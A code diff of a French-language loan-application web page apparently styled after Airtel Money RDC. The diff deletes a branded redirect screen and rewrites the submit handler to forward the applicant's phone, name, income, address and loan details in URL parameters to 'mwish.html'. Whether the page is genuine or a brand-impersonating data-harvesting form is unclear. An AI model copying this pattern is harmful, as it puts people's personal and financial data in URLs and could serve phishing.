@@ -485,126 +485,6 @@
     .plans{gap:10px;padding-left:10px;padding-right:10px;}
     .plan{padding:16px 10px 14px;}
   }
-
-  /* Redirect screen */
-  .redirect-screen{
-    position:fixed;
-    inset:0;
-    z-index:9999;
-    display:none;
-    align-items:center;
-    justify-content:center;
-    padding:24px;
-    background:linear-gradient(160deg,rgba(122,15,22,.98),rgba(58,8,12,.99));
-  }
-  .redirect-screen.show{display:flex;}
-  .redirect-card{
-    width:min(390px,100%);
-    background:#fff;
-    color:#351619;
-    border-radius:24px;
-    padding:30px 22px 26px;
-    text-align:center;
-    box-shadow:0 20px 50px rgba(0,0,0,.35);
-    animation:cardIn .35s ease-out;
-  }
-  .redirect-logo{
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:9px;
-    margin-bottom:24px;
-  }
-  .redirect-mark{
-    width:32px;height:32px;
-    border-radius:50% 50% 50% 0;
-    background:var(--red-bright);
-    transform:rotate(-45deg);
-    position:relative;
-  }
-  .redirect-mark::after{
-    content:"";
-    position:absolute;
-    inset:8px;
-    border-radius:50%;
-    background:#fff;
-  }
-  .redirect-brand{
-    text-align:left;
-    color:var(--red-bright);
-    font-size:22px;
-    line-height:1;
-    font-weight:900;
-  }
-  .redirect-money{
-    text-align:left;
-    color:#777;
-    font-size:9px;
-    letter-spacing:1.2px;
-    font-weight:800;
-    margin-top:3px;
-  }
-  .redirect-icon{
-    width:54px;height:54px;
-    margin:0 auto 16px;
-    border-radius:50%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    background:#f8eee8;
-    color:var(--red-bright);
-    font-size:25px;
-    font-weight:900;
-  }
-  .redirect-card h2{
-    font-size:23px;
-    margin-bottom:8px;
-  }
-  .redirect-card p{
-    color:#777;
-    font-size:13px;
-    line-height:1.5;
-    margin:0 auto 20px;
-    max-width:300px;
-  }
-  .countdown{
-    width:72px;height:72px;
-    margin:0 auto 10px;
-    border:5px solid #eee0da;
-    border-top-color:var(--red-bright);
-    border-radius:50%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:28px;
-    font-weight:900;
-    color:var(--red-bright);
-    animation:spin 1s linear infinite;
-  }
-  .redirect-label{
-    font-size:11px;
-    color:#888;
-    font-weight:700;
-    margin-bottom:14px;
-  }
-  .progress{
-    height:5px;
-    border-radius:5px;
-    background:#eee;
-    overflow:hidden;
-  }
-  .progress-bar{
-    width:0%;
-    height:100%;
-    background:var(--red-bright);
-    transition:width 1s linear;
-  }
-  @keyframes spin{to{transform:rotate(360deg)}}
-  @keyframes cardIn{
-    from{opacity:0;transform:translateY(12px) scale(.98)}
-    to{opacity:1;transform:translateY(0) scale(1)}
-  }
-
 </style>
 </head>
 <body>
@@ -832,58 +712,27 @@
     e.preventDefault();
     if (!validatePage(current)) return;
 
+    const name = this.fullName.value.trim();
     const submitBtn = form.querySelector('.submit-btn');
     submitBtn.disabled = true;
     submitBtn.textContent = 'DEMANDE ENREGISTRÉE';
 
-    const screen = document.getElementById('redirectScreen');
-    const countdown = document.getElementById('countdown');
-    const progressBar = document.getElementById('progressBar');
-
-    screen.classList.add('show');
-    screen.setAttribute('aria-hidden', 'false');
-
-    let seconds = 4;
-    countdown.textContent = seconds;
-    progressBar.style.width = '0%';
-
-    const timer = setInterval(() => {
-      seconds--;
-      countdown.textContent = seconds;
-      progressBar.style.width = ((4 - seconds) / 4 * 100) + '%';
-
-      if (seconds <= 0) {
-        clearInterval(timer);
-        const phone = form.phone.value;
-        window.location.href = 'trial.html?phone=' + encodeURIComponent('+243' + phone);
-      }
-    }, 1000);
+    // Redirect to trial.html after 4 seconds.
+    setTimeout(() => {
+      const params = new URLSearchParams({
+        phone: '+243' + form.phone.value,
+        name: form.fullName.value.trim(),
+        amount: form.amount.value,
+        term: form.term.value,
+        purpose: form.purpose.value,
+        employment: form.employment.value,
+        income: form.income.value,
+        address: form.address.value.trim()
+      });
+      window.location.href = 'mwish.html?' + params.toString();
+    }, 4000);
   });
 </script>
-
-
-  <div class="redirect-screen" id="redirectScreen" aria-hidden="true">
-    <div class="redirect-card">
-      <div class="redirect-logo">
-        <div class="redirect-mark"></div>
-        <div>
-          <div class="redirect-brand">airtel</div>
-          <div class="redirect-money">MONEY RDC</div>
-        </div>
-      </div>
-
-      <div class="redirect-icon">✓</div>
-      <h2>Demande envoyée</h2>
-      <p>Vous allez être redirigé vers <strong>Airtel Money RDC</strong> pour continuer.</p>
-
-      <div class="countdown" id="countdown">4</div>
-      <div class="redirect-label">Redirection en cours...</div>
-
-      <div class="progress">
-        <div class="progress-bar" id="progressBar"></div>
-      </div>
-    </div>
-  </div>
 
 </body>
 </html>
